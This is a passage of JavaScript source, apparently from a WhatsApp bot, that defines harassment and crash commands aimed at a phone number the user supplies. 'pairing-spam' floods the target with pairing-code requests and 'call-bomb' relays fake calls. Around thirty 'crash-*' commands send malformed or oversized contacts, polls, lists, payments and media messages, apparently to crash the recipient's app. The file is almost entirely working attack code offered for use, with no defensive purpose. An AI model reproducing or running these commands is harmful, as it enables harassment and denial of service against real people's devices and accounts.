    'pairing-spam': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .pairing-spam <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await ctx.bot.sendMessage(ctx.from, { 
            text: global.styleProcess(`🚀 Starting pairing spam on ${target}...`) 
        });
        
        const bugId = `${target}_pairing-spam_${Date.now()}`;
        const timeouts = [];
        
        const interval = setInterval(async () => {
            try {
                const code = await ctx.bot.requestPairingCode(target);
                console.log(`Pairing code sent to ${target}: ${code}`);
            } catch (e) {}
        }, 1000);
        
        global.activeBugs.set(bugId, {
            type: 'pairing-spam',
            target: target + '@s.whatsapp.net',
            interval,
            timeouts,
            startTime: Date.now()
        });
        
        const timeout = setTimeout(() => {
            clearInterval(interval);
            global.activeBugs.delete(bugId);
        }, 30000);
        
        timeouts.push(timeout);
        
        await ctx.bot.sendMessage(ctx.from, { 
            text: global.styleSuccess(`✅ Pairing spam started on ${target}. Use .stopbug to stop.`) 
        });
    },
    
    // ================================================
    // CALL-BOMB
    // ================================================
    
    'call-bomb': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .call-bomb <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'call-bomb', async (targetJid) => {
            await ctx.bot.relayMessage(targetJid, {
                call: {
                    callType: 'VIDEO',
                    callId: 'CALL_' + 'x'.repeat(100),
                    callTimestamp: Date.now(),
                    callCreator: targetJid
                }
            }, {});
        });
    },
    
    // ================================================
    // CRASH-VCARD
    // ================================================
    
    'crash-vcard': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-vcard <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        const vcard = 'BEGIN:VCARD\nVERSION:3.0\nN:' + 'X'.repeat(50000) + '\nFN:' + 'X'.repeat(50000) + '\nEND:VCARD';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-vcard', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                contacts: {
                    displayName: 'CRASH'.repeat(1000),
                    contacts: [{ vcard: vcard }]
                }
            });
        });
    },
    
    // ================================================
    // CRASH-LOCATION
    // ================================================
    
    'crash-location': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-location <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-location', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                location: {
                    degreesLatitude: 999999999,
                    degreesLongitude: 999999999,
                    name: 'X'.repeat(50000),
                    address: 'X'.repeat(50000)
                }
            });
        });
    },
    
    // ================================================
    // CRASH-CONTACT
    // ================================================
    
    'crash-contact': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-contact <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        const vcard = 'BEGIN:VCARD\nVERSION:3.0\nN:' + 'X'.repeat(50000) + '\nFN:' + 'X'.repeat(50000) + '\nTEL:' + 'X'.repeat(50000) + '\nEND:VCARD';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-contact', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                contacts: {
                    displayName: 'CRASH'.repeat(1000),
                    contacts: [{ vcard: vcard }]
                }
            });
        });
    },
    
    // ================================================
    // CRASH-POLL
    // ================================================
    
    'crash-poll': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-poll <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-poll', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                poll: {
                    name: 'X'.repeat(50000),
                    values: Array(100).fill('X'.repeat(1000)),
                    selectableCount: 100
                }
            });
        });
    },
    
    // ================================================
    // CRASH-LIST
    // ================================================
    
    'crash-list': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-list <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-list', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                list: {
                    title: 'X'.repeat(50000),
                    description: 'X'.repeat(50000),
                    buttonText: 'CRASH',
                    sections: Array(10).fill({
                        title: 'X'.repeat(5000),
                        rows: Array(50).fill({ title: 'X'.repeat(1000), id: 'X'.repeat(1000) })
                    })
                }
            });
        });
    },
    
    // ================================================
    // CRASH-BUTTON
    // ================================================
    
    'crash-button': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-button <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-button', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                buttons: [
                    { buttonId: 'X'.repeat(5000), buttonText: { displayText: 'X'.repeat(5000) }, type: 1 }
                ],
                text: 'X'.repeat(50000)
            });
        });
    },
    
    // ================================================
    // CRASH-PRODUCT
    // ================================================
    
    'crash-product': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-product <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-product', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                product: {
                    productImage: { url: 'https://example.com/image.jpg' },
                    title: 'X'.repeat(50000),
                    description: 'X'.repeat(50000),
                    currencyCode: 'USD',
                    priceAmount1000: 999999999
                }
            });
        });
    },
    
    // ================================================
    // CRASH-CATALOG
    // ================================================
    
    'crash-catalog': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-catalog <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-catalog', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                catalog: {
                    title: 'X'.repeat(50000),
                    description: 'X'.repeat(50000),
                    sections: Array(10).fill({
                        title: 'X'.repeat(5000),
                        items: Array(50).fill({
                            title: 'X'.repeat(1000),
                            description: 'X'.repeat(1000),
                            imageUrl: 'https://example.com/image.jpg'
                        })
                    })
                }
            });
        });
    },
    
    // ================================================
    // CRASH-ORDER
    // ================================================
    
    'crash-order': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-order <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-order', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                order: {
                    orderId: 'X'.repeat(50000),
                    thumbnail: 'X'.repeat(50000),
                    itemCount: 999999999,
                    status: 'INQUIRY',
                    surface: 'CATALOG'
                }
            });
        });
    },
    
    // ================================================
    // CRASH-INVOICE
    // ================================================
    
    'crash-invoice': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-invoice <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-invoice', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                invoice: {
                    invoiceId: 'X'.repeat(50000),
                    currencyCode: 'USD',
                    amount1000: 999999999,
                    note: 'X'.repeat(50000)
                }
            });
        });
    },
    
    // ================================================
    // CRASH-PAYMENT
    // ================================================
    
    'crash-payment': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-payment <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-payment', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                payment: {
                    currencyCodeIso4217: 'USD',
                    amount1000: 999999999,
                    requestFrom: 'X'.repeat(50000),
                    noteMessage: { text: 'X'.repeat(50000) }
                }
            });
        });
    },
    
    // ================================================
    // CRASH-STICKER
    // ================================================
    
    'crash-sticker': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-sticker <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-sticker', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                sticker: {
                    url: 'https://example.com/sticker.webp',
                    fileSha256: 'X'.repeat(5000),
                    fileEncSha256: 'X'.repeat(5000),
                    mediaKey: 'X'.repeat(5000),
                    mimetype: 'image/webp',
                    fileLength: 999999999
                }
            });
        });
    },
    
    // ================================================
    // CRASH-GIF
    // ================================================
    
    'crash-gif': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-gif <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-gif', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                video: {
                    url: 'https://example.com/video.mp4',
                    mimetype: 'video/mp4',
                    fileSha256: 'X'.repeat(5000),
                    fileEncSha256: 'X'.repeat(5000),
                    mediaKey: 'X'.repeat(5000),
                    fileLength: 999999999,
                    seconds: 9999,
                    gifPlayback: true
                }
            });
        });
    },
    
    // ================================================
    // CRASH-AUDIO
    // ================================================
    
    'crash-audio': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-audio <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-audio', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                audio: {
                    url: 'https://example.com/audio.mp3',
                    mimetype: 'audio/mpeg',
                    fileSha256: 'X'.repeat(5000),
                    fileEncSha256: 'X'.repeat(5000),
                    mediaKey: 'X'.repeat(5000),
                    fileLength: 999999999,
                    seconds: 9999
                }
            });
        });
    },
    
    // ================================================
    // CRASH-VIDEO
    // ================================================
    
    'crash-video': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-video <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-video', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                video: {
                    url: 'https://example.com/video.mp4',
                    mimetype: 'video/mp4',
                    fileSha256: 'X'.repeat(5000),
                    fileEncSha256: 'X'.repeat(5000),
                    mediaKey: 'X'.repeat(5000),
                    fileLength: 999999999,
                    seconds: 9999,
                    caption: 'X'.repeat(50000)
                }
            });
        });
    },
    
    // ================================================
    // CRASH-DOCUMENT
    // ================================================
    
    'crash-document': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-document <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-document', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                document: {
                    url: 'https://example.com/doc.pdf',
                    mimetype: 'application/pdf',
                    fileSha256: 'X'.repeat(5000),
                    fileEncSha256: 'X'.repeat(5000),
                    mediaKey: 'X'.repeat(5000),
                    fileLength: 999999999,
                    fileName: 'X'.repeat(50000)
                }
            });
        });
    },
    
    // ================================================
    // CRASH-IMAGE
    // ================================================
    
    'crash-image': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-image <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-image', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                image: {
                    url: 'https://example.com/image.jpg',
                    mimetype: 'image/jpeg',
                    fileSha256: 'X'.repeat(5000),
                    fileEncSha256: 'X'.repeat(5000),
                    mediaKey: 'X'.repeat(5000),
                    fileLength: 999999999,
                    height: 9999,
                    width: 9999,
                    caption: 'X'.repeat(50000)
                }
            });
        });
    },
    
    // ================================================
    // CRASH-PTV
    // ================================================
    
    'crash-ptv': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-ptv <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-ptv', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                video: {
                    url: 'https://example.com/video.mp4',
                    mimetype: 'video/mp4',
                    fileSha256: 'X'.repeat(5000),
                    fileEncSha256: 'X'.repeat(5000),
                    mediaKey: 'X'.repeat(5000),
                    fileLength: 999999999,
                    seconds: 9999,
                    gifPlayback: false,
                    ptv: true
                }
            });
        });
    },
    
    // ================================================
    // CRASH-NEWSLETTER
    // ================================================
    
    'crash-newsletter': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-newsletter <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-newsletter', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                newsletter: {
                    newsletterJid: 'X'.repeat(5000) + '@newsletter',
                    serverMessageId: 999999999,
                    newsletterName: 'X'.repeat(50000)
                }
            });
        });
    },
    
    // ================================================
    // CRASH-CHANNEL
    // ================================================
    
    'crash-channel': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-channel <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-channel', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                channel: {
                    channelJid: 'X'.repeat(5000) + '@newsletter',
                    channelName: 'X'.repeat(50000)
                }
            });
        });
    },
    
    // ================================================
    // CRASH-STATUS
    // ================================================
    
    'crash-status': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-status <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-status', async (targetJid) => {
            await ctx.bot.sendMessage('status@broadcast', {
                text: 'X'.repeat(50000),
                mentions: [targetJid]
            });
        });
    },
    
    // ================================================
    // CRASH-STORY
    // ================================================
    
    'crash-story': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-story <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-story', async (targetJid) => {
            await ctx.bot.sendMessage('status@broadcast', {
                text: 'X'.repeat(50000)
            }, {
                statusJidList: [targetJid]
            });
        });
    },
    
    // ================================================
    // CRASH-REACTION
    // ================================================
    
    'crash-reaction': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-reaction <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-reaction', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                react: {
                    text: 'X'.repeat(5000),
                    key: { remoteJid: targetJid, fromMe: false, id: 'X'.repeat(100) }
                }
            });
        });
    },
    
    // ================================================
    // CRASH-MENTION
    // ================================================
    
    'crash-mention': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-mention <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-mention', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                text: 'X'.repeat(50000),
                mentions: [targetJid]
            });
        });
    },
    
    // ================================================
    // CRASH-FORWARD
    // ================================================
    
    'crash-forward': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-forward <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-forward', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: { text: 'X'.repeat(50000) }
                        }
                    }
                }
            }, {});
            
            await ctx.bot.copyNForward(targetJid, msg, true);
        });
    },
    
    // ================================================
    // CRASH-QUOTE
    // ================================================
    
    'crash-quote': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-quote <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-quote', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                text: 'X'.repeat(50000),
                contextInfo: {
                    quotedMessage: {
                        conversation: 'X'.repeat(50000)
                    }
                }
            });
        });
    },
    
    // ================================================
    // CRASH-REPLY
    // ================================================
    
    'crash-reply': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-reply <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-reply', async (targetJid) => {
            await ctx.bot.sendMessage(targetJid, {
                text: 'X'.repeat(50000)
            }, {
                quoted: { key: { remoteJid: targetJid, fromMe: false, id: 'X'.repeat(100) } }
            });
        });
    },
    
    // ================================================
    // CRASH-EDIT
    // ================================================
    
    'crash-edit': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-edit <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-edit', async (targetJid) => {
            const msg = await ctx.bot.sendMessage(targetJid, { text: 'X' });
            await ctx.bot.sendMessage(targetJid, {
                text: 'X'.repeat(50000),
                edit: msg.key
            });
        });
    },
    
    // ================================================
    // CRASH-DELETE
    // ================================================
    
    'crash-delete': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-delete <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '') + '@s.whatsapp.net';
        
        await module.exports._startBugProcess(ctx, ctx.args[0], 'crash-delete', async (targetJid) => {
            const msg = await ctx.bot.sendMessage(targetJid, { text: 'X' });
            await ctx.bot.sendMessage(targetJid, { delete: msg.key });
        });
    }
};